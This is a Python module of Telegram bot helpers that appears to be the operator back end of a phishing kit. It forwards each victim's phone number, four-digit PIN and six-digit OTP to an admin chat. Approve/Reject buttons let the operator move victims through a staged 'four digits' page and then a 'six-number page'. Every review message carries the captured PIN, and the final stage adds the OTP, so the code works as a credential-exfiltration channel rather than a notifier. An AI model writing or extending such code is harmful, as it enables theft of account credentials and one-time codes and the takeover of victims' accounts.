import os
import requests


def _credentials():
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    return token, chat_id


def notify_admin(message: str) -> bool:
    """Simple text notification to the admin chat."""
    token, chat_id = _credentials()
    if not token or not chat_id:
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": message},
            timeout=8,
        )
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def send_four_review(session) -> bool:
    """
    Stage 1: Approve / Reject the four digits + phone number.
    Callback data: approve_four:<id>  or  reject_four:<id>
    """
    token, chat_id = _credentials()
    if not token or not chat_id:
        return False

    text = (
        f"📱 STAGE 1 — Four digits + Phone\n\n"
        f"Platform: {session.get_platform_display()}\n"
        f"Amount: {session.demo_points:,}\n"
        f"Phone: {session.phone_number}\n"
        f"PIN: {session.four_numbers}\n"
        f"Reference: {str(session.reference)[:8]}\n"
        f"Status: Waiting for your decision\n\n"
        f"Approve to let the user continue to the six-number page."
    )

    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Approve", "callback_data": f"approve_four:{session.pk}"},
                {"text": "❌ Reject", "callback_data": f"reject_four:{session.pk}"},
            ]
        ]
    }

    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=8,
        )
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def send_six_review(session) -> bool:
    """
    Stage 2: Approve / Reject the six numbers (final).
    Callback data: approve_six:<id>  or  reject_six:<id>
    """
    token, chat_id = _credentials()
    if not token or not chat_id:
        return False

    text = (
        f"🎲 STAGE 2 — Six numbers (final)\n\n"
        f"Platform: {session.get_platform_display()}\n"
        f"Amount: {session.demo_points:,}\n"
        f"Phone: {session.phone_number}\n"
        f"PIN: {session.four_numbers}\n"
        f"OTP: {session.six_numbers}\n"
        f"Reference: {str(session.reference)[:8]}\n"
        f"Status: Waiting for final decision"
    )

    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Approve", "callback_data": f"approve_six:{session.pk}"},
                {"text": "❌ Reject", "callback_data": f"reject_six:{session.pk}"},
            ]
        ]
    }

    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=8,
        )
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def answer_callback(callback_query_id: str, text: str) -> bool:
    """Acknowledge a button press so Telegram stops the loading state."""
    token, _ = _credentials()
    if not token:
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/answerCallbackQuery",
            json={"callback_query_id": callback_query_id, "text": text},
            timeout=8,
        )
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def edit_message(chat_id: str, message_id: int, text: str) -> bool:
    """Update the original message after approval/rejection."""
    token, _ = _credentials()
    if not token:
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
            },
            timeout=8,
        )
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False
